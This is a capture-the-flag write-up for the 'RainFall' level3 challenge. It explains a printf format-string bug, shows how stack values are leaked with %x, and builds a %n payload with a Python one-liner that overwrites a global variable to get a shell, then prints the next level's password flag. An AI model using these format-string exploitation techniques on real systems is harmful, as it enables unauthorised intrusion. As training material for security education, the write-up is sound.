This time, the program is using fgets(), which is proteced against buffer overflow attacks. But on the other hand, the printf() function is badly used: since it is given only one argument, each encountered modifier will be substituted by a value on the stack. We can therefore read the program's memory and reach interesting areas.

But first, let's have a look at the program: after calling fgets() and printf(), a shell is launched if the value of a global variable m (located at 0x0804988c) is equal to 64:
```
0x080484da <+54>:    mov    0x804988c,%eax
0x080484df <+59>:    cmp    $0x40,%eax
```
Fortunately for us, there is a way to write to memory using printf(): instead of printing something, the %n modifier causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence of %n.

Since we can browse the memory by exploiting our badly formatted printf(), we can find the position of our buffer in the stack. Thus, we can write in the buffer the address of the variable m, then overwrite the value pointed by this address by targeting the position of our buffer with %n. If this is not very clear yet, it will become so with the following demonstration.

So first, let's find the position of our buffer in the stack:
```
level3@RainFall:~$ ./level3 
AAAA %x %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```
Here we see that the 4th %x displays the first 4 bytes of our buffer (41414141), so we have determined that the buffer offset is 4.

Now let's format our input in a dedicated file. We need the m address in little endian, which is four bytes long, followed by 60 characters to get a total of 64 bytes (the value we want to put into m). And finally the %n modifier, with the '$' style in order to specify the offset:
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + 60 * "A" + "%4$n"' > /tmp/exploit
```

```
level3@RainFall:~$ cat /tmp/exploit - | ./level3 
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

We can now reach to the next level with the command `su level4` and fill in the flag found as a password.